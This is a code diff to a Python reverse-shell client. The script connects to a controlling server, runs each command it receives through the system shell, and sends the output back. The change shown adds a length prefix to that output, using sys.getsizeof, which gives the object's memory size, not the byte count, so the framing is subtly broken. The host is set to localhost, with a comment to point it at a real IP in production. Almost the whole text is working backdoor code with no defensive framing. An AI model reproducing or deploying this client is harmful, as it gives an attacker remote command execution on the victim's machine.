@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import sys
 
 # Set IP address and PORT to the server
 SERVER_HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
@@ -23,9 +24,11 @@ while True:
         # Open command prompt and insert command given by the server
         cmdPrompt = subprocess.Popen(serverCommand, shell=True, stdout=subprocess.PIPE,
                                      stderr=subprocess.STDOUT, text=True)
-        getOutput = cmdPrompt.stdout.read()
+        getOutput = cmdPrompt.stdout.read().encode()
+
         # Send back the output
-        client.send(getOutput.encode())
+        client.send(str(sys.getsizeof(getOutput)).encode())
+        client.send(getOutput)
 
 # client.close()
 print(f'[INFO] {SERVER_HOST} disconnected.')
